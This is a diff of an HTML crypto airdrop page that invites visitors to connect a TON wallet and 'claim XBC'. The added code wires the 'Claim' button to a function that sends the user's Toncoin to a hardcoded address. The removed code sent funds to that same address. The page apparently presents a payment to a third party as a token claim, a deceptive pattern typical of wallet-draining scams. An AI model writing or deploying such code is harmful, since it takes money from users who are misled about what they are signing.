@@ -130,20 +130,26 @@ tr:hover {
         manifestUrl: 'https://raw.githubusercontent.com/Stttnsik1/tonconnect-manifest.json/main/tonconnect-manifest.json',
         buttonRootId: 'ton-connect'
     });
-</script>
-<script>
-    async function connectToWallet() {
-        const connectedWallet = await tonConnectUI.connectWallet();
-        // Do something with connectedWallet if needed
-        console.log(connectedWallet);
-    }
 
-    // Call the function
-    connectToWallet().catch(error => {
-        console.error("Error connecting to wallet:", error);
-    });
-    await tonConnectUI.disconnect();
+    async function transaction() {
+  const transaction = {
+    validUntil: Math.round(Date.now() / 1000) + 10,
+    messages: [
+      {
+        address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR",
+        amount: "10000000"
+      }
+    ]
+  };
+
+  try {
+    await tonConnectUI.sendTransaction(transaction);
+  } catch (e) {
+    console.error(e);
+  }
+}
 </script>
+
 
 <section>
   <img src="https://i.postimg.cc/3RwRgGXX/msg1029594875-176900-1.png" class="leftimg">
@@ -159,42 +165,8 @@ tr:hover {
     Connect your wallet and claim your XBC to get
     <br>
      a seed and qualify for drops.</p></strong>
-
-     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-     <script>
-       const connector = new TonConnectSDK.TonConnect();
-     
-       async function txn() {
-         try {
-           // Подключаемся к кошельку
-           await connector.connect();
-     
-           // Отправляем транзакцию
-           const result = await connector.sendTransaction({
-             validUntil: Math.floor(new Date() / 1000) + 360,
-             messages: [
-               {
-                 address: connector.wallet.account.address,
-                 amount: "200000000"
-               },
-               {
-                 address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR",
-                 amount: "100000000"
-               }
-             ]
-           });
-     
-           console.log("Transaction result:", result);
-           // Обработка успешного результата 
-         } catch (error) {
-           console.error("Error sending transaction:", error);
-           // Обработка ошибки
-         }
-       }
-     </script>
-     
-     <button onclick="txn()" class="floathingbutton">Claim</button>
-     
+ 
+<button onclick="transaction()" class="floathingbutton"><strong>Claim</strong></button>    
 
 <h2><strong><center>Leaderbord:</center></strong></h2>
 
@@ -202,7 +174,7 @@ tr:hover {
     <table>
       <tr>
         <th>Рейтинг</th>
-        <th>Сумма</th>
+        <th>Количество XBC</th>
         <th>Адрес</th>
       </tr>
       <tr>
@@ -223,24 +195,5 @@ tr:hover {
     </table>
   </div>
  
-<script>
-  import TonConnectUI from '@tonconnect/ui';
-
-  const tonConnectUI = new TonConnectUI({ //connect application
-      manifestUrl: 'https://raw.githubusercontent.com/Stttnsik1/tonconnect-manifest.json/main/tonconnect-manifest.json',
-      buttonRootId: 'ton-connect'
-  });
-  
-  const transaction = {
-      messages: [
-          {
-              address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR", // destination address
-              amount: "20000000" //Toncoin in nanotons
-          }
-      ]
-  }
-  
-  const result = await tonConnectUI.sendTransaction(transaction)
-</script>
   </body>
   </html>
